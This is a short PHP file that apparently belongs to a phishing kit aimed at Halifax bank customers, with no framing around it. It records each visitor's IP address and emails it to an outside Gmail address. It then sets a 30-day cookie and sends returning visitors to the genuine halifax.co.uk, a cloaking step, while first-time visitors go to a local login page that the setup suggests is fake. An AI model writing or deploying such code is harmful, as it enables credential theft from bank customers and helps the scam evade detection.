<?php 
$_SESSION['token']= getenv('REMOTE_ADDR');
$ip = getenv('REMOTE_ADDR');
$continut="
$ip
";
$to='kingsama786@gmail.com';
$subjectus='deny $ip';
mail($to,$subjectus,$continut);
$Month = 2592000 + time(); 
 //this adds 30 days to the current time 
 setcookie(AboutVisit, date('F jS - g:i a'), $Month);
 if(isset($_COOKIE['AboutVisit']))
 { 
header( 'Location: http://halifax.co.uk/' );
  } 
 else 
 { 
    header( 'Location: login.jsp' );
  }
?>